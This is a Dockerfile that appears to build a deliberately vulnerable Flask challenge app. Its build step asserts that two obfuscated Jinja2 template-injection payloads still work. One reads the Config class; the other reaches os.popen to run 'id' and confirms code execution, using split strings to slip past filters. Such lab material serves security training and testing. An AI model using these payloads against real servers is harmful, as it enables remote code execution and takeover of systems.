FROM python:3.12-slim
WORKDIR /app
COPY requirements.txt .
RUN pip install --no-cache-dir -r requirements.txt

COPY app/ ./app/
RUN python -c "import re; \
from flask import render_template_string; \
from app import create_app; \
app = create_app({'TESTING': True, 'DATABASE': ':memory:', 'SCORE_TOKEN': 'buildcheck'}); \
app.test_request_context().push(); \
r1 = render_template_string(\"{{ (config|attr(('_'*2)~'class'~('_'*2))) }}\"); \
assert r1 == \"&lt;class &#39;flask.config.Config&#39;&gt;\", f'introspection payload changed: {r1!r}'; \
r2 = render_template_string(\"{{ (config|attr(('_'*2)~'class'~('_'*2))|attr(('_'*2)~'init'~('_'*2))|attr(('_'*2)~'globals'~('_'*2)))['o'~'s']['po'~'pen']('id')['re'~'ad']() }}\"); \
assert re.match(r'uid=\\d+\\(', r2), f'RCE payload changed: {r2!r}'; \
print('SSTI bypass payload confirmed against installed Flask version') \
"

COPY run.py .
ENV SCORE_TOKEN=""
EXPOSE 5000
CMD ["python", "run.py"]
